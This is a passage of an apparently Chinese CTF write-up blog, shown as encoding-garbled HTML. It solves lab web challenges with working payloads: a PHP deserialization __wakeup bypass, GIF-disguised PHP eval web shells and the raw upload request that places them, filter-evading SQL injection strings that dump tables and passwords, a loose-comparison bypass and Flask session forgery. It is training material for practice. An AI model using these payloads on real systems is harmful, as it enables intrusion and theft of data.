</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=o>$</span><span class=n>username</span><span class=p>,</span><span class=o>$</span><span class=n>password</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>username</span> <span class=o>=</span> <span class=o>$</span><span class=n>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>password</span> <span class=o>=</span> <span class=o>$</span><span class=n>password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>username</span> <span class=o>=</span> <span class=s1>&#39;guest&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>function</span> <span class=n>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>password</span> <span class=o>!=</span> <span class=mi>100</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;You name is: &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>username</span><span class=p>;</span><span class=n>echo</span> <span class=s2>&#34;&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;You password is: &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>password</span><span class=p>;</span><span class=n>echo</span> <span class=s2>&#34;&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>username</span> <span class=o>===</span> <span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>global</span> <span class=o>$</span><span class=n>flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=o>$</span><span class=n>flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>echo</span> <span class=s2>&#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>è·å–flagçš„ä»£ç ä½ç½®æ˜¯30-32è¡Œã€‚åˆ†æè¿™ä¸ªNameå¯¹è±¡ï¼Œåˆ›å»ºå¯¹è±¡æ—¶å¯ä»¥ä¸ºå¯¹è±¡èµ‹å€¼ï¼Œå¯¹è±¡é”€æ¯æ—¶ä¼šåˆ¤æ–­passwordå€¼æ˜¯å¦æ˜¯100ï¼Œä¸”usernameå€¼æ˜¯å¦ä¸ºadminï¼Œå¦‚æœä¸¤è€…éƒ½æˆç«‹è¾“å‡ºflagï¼Œä½†æ˜¯__wakeupï¼ˆï¼‰ä¼šåœ¨ååºåˆ—åŒ–æ—¶è°ƒç”¨å°†usernameå€¼ç½®ä¸ºguestï¼Œæ‰€ä»¥éœ€è¦ååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™é‡Œé¢æœ‰ååºåˆ—åŒ–è®²è§£<a class=link href=https://www.cnblogs.com/zy-king-karl/p/11436872.html target=_blank rel=noopener>CVE-2016-7124æ¼æ´å¤ç°</a></p><p>æˆ‘ä½¿ç”¨çš„æ„é€ å¯¹è±¡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>class Name{
</span></span><span class=line><span class=cl>    private $username =&#39;admin&#39;;
</span></span><span class=line><span class=cl>    private $password =&#39;100&#39;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$a = new Name;
</span></span><span class=line><span class=cl>echo serialize($a);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>O:4:&#34;Name&#34;:2:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;s:3:&#34;100&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>ååºåˆ—åŒ–é€ƒé€¸ï¼Œä½¿å¯¹è±¡å±æ€§çš„æ•°é‡å¤§äºåŸæ¥çš„å€¼ï¼Œå°±å¯ä»¥ç»•è¿‡wakeupå‡½æ•°ã€‚æœ€ç»ˆpayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?select=O:4:&#34;Name&#34;:3:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;s:3:&#34;100&#34;;}
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019upload>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121111429.png loading=lazy></p><p>å…ˆå°è¯•ä¸Šä¼ ä¸€ä¸ªgifå›¾ç‰‡é©¬å†…å®¹ä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@eval($_POST[&#39;a&#39;]);
</span></span></code></pre></td></tr></table></div></div><p>é¡µé¢æç¤ºè¿‡æ»¤ï¼š</p><blockquote><p>NO! HACKER! your file included &lsquo;&lt;?&rsquo;</p></blockquote><p>å°è¯•scriptæ‰§è¡Œphpä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥ä¸Šä¼ ï¼Œæ–‡ä»¶åœ¨/uploadç›®å½•ä¸‹ã€‚å°è¯•ä¿®æ”¹åç¼€ä¸Šä¼ ï¼Œphtmlä¸Šä¼ æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œphpå’Œscriptä»£ç ï¼Œä½¿ç”¨èšå‰‘è¿æ¥ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121112135.png loading=lazy></p><hr><h1 id=20210128>2021.01.28</h1><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019babysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128113412.png loading=lazy></p><p>å°è¯•ä¸‡èƒ½å¯†ç ï¼Œå‘ç°æŠ¥é”™äº†ï¼š1=1#&rsquo; and password=&lsquo;123&rsquo;ï¼Œä¹Ÿè®¸æ˜¯orè¢«è¿‡æ»¤äº†æˆ–è€…åˆ æ‰äº†ï¼Œå°è¯•å¤§å°å†™æ— æœï¼Œä½†æ˜¯å°è¯•åŒå†™é€šè¿‡äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯çˆ†è¡¨ï¼Œçˆ†æ•°æ®åº“çš„è¯­å¥ä¸­æœ‰<strong>information</strong>è¿™ä¸ªè¯ï¼Œå…¶ä¸­çš„<strong>for</strong>ä¹Ÿä¼šè¢«è¿‡æ»¤ã€‚å…¶ä»–è¿‡æ»¤çš„è¯æˆ‘é‡åˆ°çš„æœ‰ï¼šunionï¼Œselectã€fromã€whereã€andã€‚</p><p>çˆ†æ•°æ®åº“ï¼ˆå¡«å¯†ç ï¼‰ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
</span></span></code></pre></td></tr></table></div></div><p>çˆ†è¡¨ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#39;b4bsql&#39; #
</span></span></code></pre></td></tr></table></div></div><p>çˆ†å­—æ®µå€¼ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-æ–°ç”Ÿèµ›upload>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128114257.png loading=lazy></p><p>æŒ‡é’ˆæ”¾åœ¨ç¯æ³¡ä¸ŠæŠ¤æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶çš„ï¼Œå›¾ç‰‡é©¬</p><p>233.gif</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@eval($_POST[&#39;a&#39;]);
</span></span></code></pre></td></tr></table></div></div><p>å°è¯•phtmlæ˜¯å¦è¢«è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼ æˆåŠŸã€‚èšå‰‘è¿æ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>------</span><span class=n>WebKitFormBoundaryUMSByAQmR2cduL6R</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;upload_file&#34;</span><span class=p>;</span> <span class=n>filename</span><span class=o>=</span><span class=s2>&#34;233.phtml&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>image</span><span class=o>/</span><span class=n>gif</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>GIF89a</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>eval</span><span class=p>(</span><span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=o>------</span><span class=n>WebKitFormBoundaryUMSByAQmR2cduL6R</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=p>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=p>;</span> <span class=n>name</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>upload</span>
</span></span><span class=line><span class=cl><span class=o>------</span><span class=n>WebKitFormBoundaryUMSByAQmR2cduL6R</span><span class=o>--</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-æ–°ç”Ÿèµ›backupfile>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Try to find out source file!
</span></span></code></pre></td></tr></table></div></div><p>é¢˜ç›®æç¤ºå¤‡ä»½æ–‡ä»¶ï¼Œå¤‡ä»½æ–‡ä»¶å¸¸è§åç¼€ï¼š</p><blockquote><p>.git .svn .swp .~ .bak .bash_history</p></blockquote><p>å°è¯•index.php.bakï¼Œä¸‹è½½äº†ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include_once &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;key&#39;])) {
</span></span><span class=line><span class=cl>    $key = $_GET[&#39;key&#39;];
</span></span><span class=line><span class=cl>    if(!is_numeric($key)) {
</span></span><span class=line><span class=cl>        exit(&#34;Just num!&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    $key = intval($key);
</span></span><span class=line><span class=cl>    $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;;
</span></span><span class=line><span class=cl>    if($key == $str) {
</span></span><span class=line><span class=cl>        echo $flag;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else {
</span></span><span class=line><span class=cl>    echo &#34;Try to find out source file!&#34;;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>ä¼ ä¸€ä¸ªå¿…é¡»ä¸ºæ•°å­—çš„å‚æ•°keyï¼Œä½¿ç”¨intvalï¼ˆï¼‰å‡½æ•°å¤„ç†ï¼Œå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¾“å‡ºflagã€‚è¿™å°±æƒ³åˆ°äº†PHPä¸­çš„<code>==</code>å’Œ<code>===</code>çš„åŒºåˆ«ã€‚è´´ä¸€æ®µç®€å•ä»£ç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$str = &#39;abc&#39;;
</span></span><span class=line><span class=cl>if(0==$str){
</span></span><span class=line><span class=cl>	echo &#34;çœŸ&#34;;
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>	echo &#34;å‡&#34;;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p><code>==</code>åœ¨æ‰§è¡Œå…³ç³»è¿ç®—æ—¶ï¼Œè¦æ±‚è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´ï¼Œæ‰€ä»¥ç­‰å·å³è¾¹çš„å­—ç¬¦ä¸²è¢«å¼ºåˆ¶è½¬æ¢ä¸ºäº†æ•´å‹ï¼Œè‹¥æœ‰ä¸€æ–¹ä¸ºæ•°å­—ï¼Œå¦ä¸€æ–¹ä¸ºå­—ç¬¦ä¸²æˆ–ç©ºæˆ–nullï¼Œå‡ä¼šå…ˆå°†éæ•°å­—ä¸€æ–¹è½¬åŒ–ä¸º0ï¼Œå†åšæ¯”è¾ƒã€‚å¦‚æœå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œå°±ä¼šæˆªå–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªå­—æ¯ã€‚</p><p>å…¨ç­‰äº<code>===</code>æ“ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æ“ä½œç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¦‚æœä¸ç›¸åŒï¼Œè¿”å›false ã€‚</li><li>æ“ä½œç¬¦ä¸¤è¾¹çš„å€¼å¦‚æœä¸ç›¸åŒï¼Œè¿”å›false ã€‚</li><li>æœ€åå°†ä¸Šé¢2æ­¥çš„æ“ä½œè¿›è¡Œä¸æ“ä½œã€‚è¿”å›ä¸æ“ä½œçš„ç»“æœã€‚</li></ol><p>æ‰€ä»¥æœ€ç»ˆçš„payloadï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?key=123
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=hctf-2018admin>[HCTF 2018]admin</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202182820.png loading=lazy></p><p>å¯ä»¥åœ¨æ³¨é‡Šé‡Œæ‰¾åˆ°</p><blockquote></blockquote><p>æ€è·¯åº”è¯¥æ˜¯åªè¦æˆ‘ä»¬æ˜¯adminç™»é™†å°±å¯ä»¥å¾—åˆ°flagï¼Œå¯ä»¥æ‰¾åˆ°æ³¨å†ŒæŒ‰é’®ï¼Œä¸èƒ½æ³¨å†Œadmin,é‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªè¿›å»çœ‹çœ‹ã€‚æ‰¾åˆ°å‡ ä¸ªåŠŸèƒ½ã€‚</p><ul><li>postã€‚å‘è¡¨æ–‡ç« ï¼Œä½†æ˜¯æ²¡èƒ½æ‰¾åˆ°åœ¨å“ªé‡Œæ‰“å¼€</li><li>change passwordã€‚æ”¹å¯†ç ï¼Œå°è¯•ä¸‹èƒ½ä¸èƒ½æŠ“åŒ…æ”¹åˆ°adminçš„å¯†ç </li></ul><p>ä¿®æ”¹å¯†ç æŠ“åˆ°çš„åŒ…ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202183647.png loading=lazy></p><p>æ„Ÿè§‰å¹¶æ²¡æœ‰ä»€ä¹ˆä¸‹æ‰‹çš„åœ°æ–¹ï¼Œå”¯ä¸€çš„å°±æ˜¯sessionå¯èƒ½å’Œèº«ä»½æœ‰å…³ã€‚</p><p>ä»¥ä¸‹çš„æ˜¯çœ‹ç½‘ä¸Šçš„wp</p><p>åœ¨change passwordé¡µé¢æŸ¥çœ‹æºç ï¼Œå‘ç°æä¾›äº†é¢˜ç›®çš„æºç åœ°å€</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>ç½‘ç«™ä½¿ç”¨çš„æ˜¯flaskæ¡†æ¶ï¼Œå…·ä½“è·¯ç”±è¡¨å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/code&#39;</span><span class=p>)</span>		<span class=c1>#äºŒç»´ç </span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_code</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/index&#39;</span><span class=p>)</span>		<span class=c1>#é¦–é¡µ</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#æ³¨å†Œ</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#ç™»é™†</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)</span>		<span class=c1>#ç™»å‡º</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/change&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#ä¿®æ”¹å¯†ç </span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/edit&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#ç¼–è¾‘ä¿¡æ¯</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>():</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=è§£æ³•ä¸€flask-sessionä¼ªé€ >è§£æ³•ä¸€ï¼šflask sessionä¼ªé€ </h2><p>è¿™ä¸ªè§£æ³•å’Œå‰é¢æŸ¥çœ‹è¯·æ±‚å¤´æ—¶å‘ç°çš„sessionæœ‰å…³ï¼Œflaskæ¡†æ¶æ˜¯é€šè¿‡sessionæ¥åˆ¤æ–­ç™»å½•çš„ç”¨æˆ·èº«ä»½ï¼Œä½†æ˜¯è¿™ä¸ªsessionæ˜¯é€šè¿‡ä¸€äº›å­—ç¬¦ä¸²æ‹¼æ¥ååŠ å¯†çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“å­—ç¬¦ä¸²å’ŒåŠ å¯†ç®—æ³•ï¼Œå°±å¯ä»¥å®ç°ä¼ªé€ sessionã€‚</p><p>è´´ä¸¤ç¯‡ç›¸å…³æ–‡ç« ï¼š</p><p><a class=link href=https://xz.aliyun.com/t/3569 target=_blank rel=noopener>Python Webä¹‹flask session&æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a></p><p><a class=link href=https://www.leavesongs.com/PENETRATION/client-session-security.html# target=_blank rel=noopener>å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p><p>é¦–å…ˆéœ€è¦æ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†ä¸Šå»ï¼Œçœ‹çœ‹è¯·æ±‚å¤´Cookieé‡Œçš„sessionå€¼ã€‚</p><p>è¯´æ˜ä¸€ä¸‹flaskçš„sessionå€¼åŠ å¯†æ ¼å¼æ˜¯ï¼š<code>SECRET_KEY</code> +<code>ä¸€ä¸ªç”¨æˆ·å¯¹è±¡çš„å­—ç¬¦ä¸²</code>(å°±åƒPHPé‡Œçš„åºåˆ—åŒ–å)ã€‚<code>SECRET_KEY</code>çš„å€¼æˆ‘ä»¬å¯ä»¥åœ¨æºç é‡Œæ‰¾åˆ°ï¼šhttps://github.com/woadsl1234/hctf_flask/blob/master/app/config.pyä¸­çš„ç¬¬å››è¡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥å¾—çŸ¥<code>SECRET_KEY</code>å€¼ä¸º<code>ckj123</code>ã€‚ç„¶ååœ¨index.htmlé¡µé¢å‘ç°åªè¦session[â€˜nameâ€™] == &lsquo;adminâ€™å³å¯ä»¥å¾—åˆ°flagã€‚æ¥ä¸‹æ¥å°±è¦ä½¿ç”¨åˆ°ä¸€ä¸ªè§£å¯†å·¥å…·ï¼Œéœ€è¦è§£å¯†å‡ºç”¨æˆ·å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œå†å°†ç”¨æˆ·åæ”¹ä¸ºadminï¼ŒåŠ å¯†åå†å»è¯·æ±‚ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»¥adminçš„èº«ä»½ç™»é™†äº†ã€‚</p><p>å¦‚ä¸‹ <a class=link href=https://www.leavesongs.com/ target=_blank rel=noopener><strong>På¸ˆå‚…</strong></a> çš„ç¨‹åºè§£å¯†ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
